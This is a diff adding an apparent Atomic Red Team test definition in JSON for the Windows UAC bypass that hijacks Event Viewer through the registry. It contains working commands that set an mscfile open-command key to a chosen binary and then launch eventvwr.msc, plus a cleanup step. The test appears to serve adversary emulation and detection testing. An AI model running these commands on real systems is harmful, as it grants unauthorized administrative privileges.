@@ -1,0 +1,52 @@
+{
+  "id": "5073adf8-9a50-4bd9-b298-a9bd2ead8af9",
+  "name": "Bypass UAC using Event Viewer (cmd)",
+  "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges. \n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "63c00041-997d-44f5-9e6e-fc7c26a01aa3",
+      "type": "execute-command",
+      "data": {
+        "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\ncmd.exe /c eventvwr.msc\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8a396755-60a4-456b-8cb6-d9f8fcf8667c",
+      "type": "execute-command",
+      "data": {
+        "command": "reg.exe delete hkcu\\software\\classes\\mscfile /f \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "63c00041-997d-44f5-9e6e-fc7c26a01aa3",
+      "p": "on-success",
+      "o": "8a396755-60a4-456b-8cb6-d9f8fcf8667c"
+    },
+    {
+      "s": "63c00041-997d-44f5-9e6e-fc7c26a01aa3",
+      "p": "on-failure",
+      "o": "8a396755-60a4-456b-8cb6-d9f8fcf8667c"
+    }
+  ],
+  "tags": [
+    "T1548.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "executable_binary",
+      "type": "path",
+      "description": "Binary to execute with UAC Bypass",
+      "value": "C:\\Windows\\System32\\cmd.exe"
+    }
+  ]
+}
